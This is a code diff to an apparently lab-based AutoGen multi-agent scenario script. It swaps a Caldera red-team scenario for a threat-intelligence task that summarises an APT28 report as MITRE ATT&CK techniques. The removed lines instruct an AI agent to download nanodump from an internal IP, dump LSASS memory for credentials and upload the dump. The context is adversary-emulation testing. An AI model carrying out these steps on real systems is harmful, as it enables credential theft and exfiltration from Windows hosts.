@@ -1,5 +1,5 @@
 import autogen.runtime_logging
-from agents.caldera_agent import caldera_agent_user_proxy, caldera_agent
+from agents.ti_agent import ti_agent_user_proxy, ti_agent
 from agents.human_agent import human_analyst_agent
 
 from utils.shared_config import clean_working_directory, llm_config
@@ -12,8 +12,8 @@ def run_scenario():
     groupchat = autogen.GroupChat(
         agents=[
             human_analyst_agent,
-            caldera_agent_user_proxy,
-            caldera_agent,
+            ti_agent_user_proxy,
+            ti_agent,
         ],
         messages=[],
     )
@@ -22,13 +22,8 @@ def run_scenario():
     )
 
     scenario_messages = [
-        "Get the ID of the active Caldera operation.",
-        "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
-        "Summarize the ID and PAW from previous steps in a table.",
-        "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
-        "Analyze the available nanodump flags at https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
-        "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
-        "Use PowerShell to upload the dumped LSASS file.",
+        "Download the report from https://strapi.eurepoc.eu/uploads/Eu_Repo_C_APT_profile_APT_28_4856c0a0ac.pdf",
+        "Analyze the report and provide a detailed overview of the TTP in table format. Include the MITRE technique ID, technique name and a small description how this is used by the adversary in different columns.",
     ]
 
     for message in scenario_messages:
